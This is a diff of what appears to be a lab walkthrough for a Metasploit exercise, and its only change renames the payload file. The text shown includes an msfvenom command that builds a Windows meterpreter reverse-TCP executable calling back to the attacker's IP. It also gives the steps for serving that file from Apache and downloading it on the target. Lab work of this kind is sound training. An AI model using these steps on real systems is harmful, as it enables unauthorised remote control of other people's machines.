@@ -35,7 +35,7 @@ Find the attackers ip address using ifconfig
 
 
 Create a malicious executable file praveen.exe using msenom command
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > praveen.exe
 ## OUTPUT
 ![Screenshot 2025-04-07 111202](https://github.com/user-attachments/assets/a5850360-7890-4b7d-b3bf-f84f7eec2f96)
 
@@ -43,7 +43,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 
 
 
-copy the fun.exe into the apache /var/www/html folder
+copy the praveen.exe into the apache /var/www/html folder
 ![Screenshot 2025-04-07 115010](https://github.com/user-attachments/assets/f556dedd-f7d9-47bc-b786-0d2017262af3)
 
 
@@ -79,8 +79,8 @@ exploit
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
-http://192.168.1.2/fun.exe
-The file "fun.exe" downloads. 
+http://192.168.1.2/praveen.exe
+The file "praveen.exe" downloads. 
 ![Screenshot 2025-04-07 115416](https://github.com/user-attachments/assets/c77d859f-ec36-4ce5-a9d5-e54633f390c7)
 
 
